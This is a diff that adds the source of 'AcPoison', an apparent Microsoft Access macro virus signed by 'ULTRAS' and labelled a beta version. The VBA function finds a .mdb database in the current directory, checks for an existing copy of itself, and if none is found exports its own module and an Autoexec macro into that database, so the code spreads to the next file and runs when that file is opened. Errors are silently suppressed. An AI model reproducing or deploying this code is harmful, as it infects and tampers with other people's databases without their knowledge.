@@ -1,0 +1,25 @@
+   Attribute VB_Name = "AcPoison"
+   Option Compare Database
+   Option Explicit
+   Function ULTRAS()
+   'POiSoN BY ULTRAS
+   'Beta Version
+   'ultras2@usa.net
+   On Error Resume Next
+   Dim U, FName, CDName, Infect, POiSON As String
+   Infect = False
+   CDName = CurDir & "\"
+   FName = Dir(CDName & "*.mdb")
+   If FName <> "" Then
+   POiSON = CDName & FName
+   For U = 1 To Application.Modules.Count
+   If Application.Modules(U).Name = "AcPoison" Then
+   Infect = True
+   End If
+   Next
+   End If
+   If Infect = False Then
+   Application.DoCmd.TransferDatabase acExport, "Microsoft Access", POiSON, acModule, "AcPoison", "AcPoison"
+   Application.DoCmd.TransferDatabase acExport, "Microsoft Access", POiSON, acMacro, "Autoexec", "Autoexec"
+   End If
+   End Function
